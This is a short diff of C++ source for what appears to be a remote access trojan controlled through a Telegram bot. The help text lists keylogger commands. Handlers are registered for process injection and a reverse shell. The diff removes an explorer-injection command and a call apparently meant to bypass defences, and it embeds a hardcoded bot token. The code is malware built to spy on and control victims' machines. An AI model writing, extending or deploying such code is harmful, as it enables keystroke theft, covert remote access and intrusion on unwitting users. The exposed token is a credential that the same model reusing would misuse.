@@ -34,7 +34,6 @@ void Help(Bot* bot, Update update) {
 		"/keylog_start start the keylogger\n"
 		"/keylog_stop stops the keylogger\n"
 		"/dump_keylog dump keylogger's capture file\n"
-		"/inject_explorer\n"
 	)
 		.fire();
 }
@@ -146,7 +145,6 @@ void InjectExplorer(Bot* bot, Update update)
 //int WinMain(HINSTANCE hInstace, HINSTANCE hPrevInstance, LPSTR cmdLine, int pShowCmd)
 int main()
 {
-	bypass_shit();
 	char n[20];
 	hostname(n);
 	Bot bot = Bot("1675171994:AAFL6z9ibR3eZBFpck4AO2UNRAKccuNcgwg");
@@ -166,7 +164,6 @@ int main()
 		bot.addCommandHandler("inject_pid", &InjectPID);
 		bot.addCommandHandler("ps", &PS);
 		bot.addCommandHandler("shell", &ReverseShell);
-		bot.addCommandHandler("inject_explorer", &InjectExplorer);
 		//bot.setUpdateHandler(&Upload);
 		// Start getting updates!
 		bot.startPolling();
